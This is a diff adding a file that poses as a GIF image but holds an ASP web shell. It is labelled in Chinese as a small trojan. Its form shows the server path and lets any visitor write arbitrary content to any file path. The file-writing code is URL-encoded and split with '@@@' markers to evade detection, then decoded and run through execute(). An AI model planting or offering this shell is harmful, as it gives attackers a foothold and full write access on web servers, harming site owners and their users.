@@ -1,0 +1,21 @@
+﻿GIF89ad d  
+<html>
+<body>
+<form method=post>
+<br><font color=red>小马路径：</font><%=server.mappath(request.servervariables("script_name"))%></br>
+上传路径：<input type=text name=syfdpath  size=67>
+<br> <textarea name=cyfddata cols=80 rows=10 width=32></textarea></br>
+<br><font color=red><input type=submit value="提交"></font></br>
+</form>
+</body>
+</html>
+<%dim a,b
+a=" dim%20objFSO%2Cfdata%2CobjCountFile%20%0D%0Aon%20error%20resume%20next%20%0D%0ASet%20objFSO%20%3D%20Server.Create@@@Object%28%22Scrip@@@ting.FileSystemObject%22%29%20%0D%0Aif%20Trim%28request%28%22syfdpath%22%29%29%3C%3E%22%22%20then%20%0D%0Afdata%20%3D%20request%28%22cyfddata%22%29%20%0D%0ASet%20objCountFile%3DobjFSO.Create@@@TextFile%28request%28%22syfdpath%22%29%2CTrue%29%20%0D%0AobjCountFile.Write%20fdata%20%0D%0Aif%20err%20%3D0%20then%20response.write%20%22%3Cfont%20color%3Dred%3Esave%20Su@@@ccess%21%3C/font%3E%22%20else%20response.write%20%22save%20unsuccess%22%0D%0Aend%20if%0D%0Aerr.clear%20%0D%0AobjCountFile.Close%20%0D%0ASet%20objCountFile%3DNothing%20%0D%0ASet%20objFSO%20%3D%20Nothing%20%0D%0A"
+b=replace(a,"@@@","免")
+c=split(b,"免")
+for i=0 to ubound(c)
+temp=temp+c(i)
+next
+execute(unescape(temp))%>
+
+
